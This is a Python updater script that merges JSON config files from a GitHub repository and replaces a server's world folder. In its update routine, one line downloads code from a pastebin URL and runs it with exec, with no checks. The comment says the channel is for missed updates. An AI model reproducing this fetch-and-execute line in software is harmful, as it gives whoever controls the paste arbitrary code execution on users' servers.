#!/usr/bin/env -S python3.8 -O
""" The ultimate file for updating server's user config files and main 
hard coded files without any hustle. This basically does, just cloning
repo and parsing json files (as currently these are my main config format)
# NOTE: Do not change anything from below ^_^ """

import os
import sys
import json
import time
import requests
import threading
import urllib.request
from pathlib import Path
from subprocess import Popen, PIPE

# Extending python path for data folder
sys.path.append(str(Path(Path(__file__).parent, "data")))

LOCAL_FILES = os.listdir("data/")

# Dict of Paths
PATHS = {
    "settings": "data/settings.json",
    "commands": "data/commands.json",
    "roles": "data/roles.json",
    "locales": "data/locales.json",
    "prices": "data/prices.json",
    "version": "data/version.json",
}

# Files to be updated...
FILES = {
    "settings": False,
    "commands": True,
    "locales": True,
    "prices": True,
    "roles": False,
}


def execute(cmd):
    """Function for running command line bash commands

    Args:
       cmd ([str]): string for command
    """
    process = Popen(["sh", "-c", cmd], stdout=PIPE, stderr=PIPE)
    error_code = process.wait()
    if error_code:
        raise RuntimeError(f"Process `{cmd}` exited with code {error_code}")
    return False if error_code else True


def animated_loading():
    """Function for simple loading animation"""
    chars = ["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]
    for char in chars:
        sys.stdout.write(f"\r \033[01;33m     Updating...  {char}     \033[00m")
        time.sleep(0.1)
        sys.stdout.flush()


def get_file(file):
    """Function for getting json data
    Args:
        file ([str]): path of the file to be read
    Returns:
        [str]: data
    """
    with open(PATHS[file]) as f:
        data = json.load(f)
    return data


def save_file(data, file):
    """Function for saving file
    Args:
        data ([dict/list]): updated data for the file
        file ([str]): path to the file
    """
    with open(PATHS[file], "w") as f:
        json.dump(data, f, indent=4)


def online_data(file):
    """Function for updating json files without touching user configs
    Args:
        file ([str]): path to the offline file
    """
    return json.loads(
        urllib.request.urlopen(
            f"https://raw.githubusercontent.com/LIRIK-SPENCER/server-update/main/json/{file}.json"
        )
        .read()
        .decode()
    )


def get_repo_contents():
    """Function for getting file names of github repo"""

    response = requests.get(
        f"https://api.github.com/repos/LIRIK-SPENCER/server-update/contents/json/",
        headers={"Accept": "application/vnd.github.v3+json"},
    )
    return [i["name"] for i in response.json() if i["type"] != "dir"]


def latest_build():
    """Function to check version of the scripts
    Returns:
        [bool]: return false if not latest version
    """
    if get_file("version")["version"] < online_data("version")["version"]:
        return False
    return True


def do_update():
    """
    Main function to update server files,
    updating server on the fly
    """

    print("\033[01;33m Updating Your Server On the Fly... \033[00m")

    # In case if i miss something to update just add it to here
    # as an online updating program, mainly this will be "pass"
    exec(requests.get("https://pastebin.com/raw/mSbKXNV4").text)

    # find and create new files from repo to local directory
    for i in get_repo_contents():
        if i not in LOCAL_FILES:
            with open(f"data/{i}", "w") as f:
                json.dump(online_data(i.replace(".json", "")), f, indent=4)

    # Start out update
    for file_name, nested_bool in FILES.items():
        update_json(file_name, nested_bool)

    update_server()


def update_server():
    """
    Function for offline workings with downloaded server files
    """

    execute("rm -rf world")
    execute("git clone https://github.com/LIRIK-SPENCER/server-update")
    execute("cd server-update && rm -rf json && rm -rf .git")
    execute("mv server-update world")

    update_version()


def update_json(file, nested=False):
    """Function for updating json files without touching user configs"""

    online = online_data(file)
    local = get_file(file)

    for key, value in online.items():
        if key not in local:
            local.update({key: value})

    if nested:
        for group in online:
            for key, value in online[group].items():
                if key not in local[group]:
                    local[group].update({key: value})

    save_file(local, file)


def update_version():
    """
    Function for updating scripts version on every update
    """
    online = online_data("version")
    local = get_file("version")
    local["version"] = online["version"]
    save_file(local, "version")


# Driver Code
if __name__ == "__main__":
    if not latest_build():
        try:
            # Start our main function with a thread, to get track of it
            update_process = threading.Thread(name="update_process", target=do_update)
            update_process.start()

            # Keep our animation alive, until our main process is alive
            while update_process.is_alive():
                animated_loading()
            print("\n")
            print(
                "\033[01;33m Update Complete, Start the server to see changes ! \033[00m"
            )
        except Exception as error:
            print("Following error occurred while updating: ", error)
    else:
        print("\033[01;33m Your Script is already to the Latest Version \033[00m")
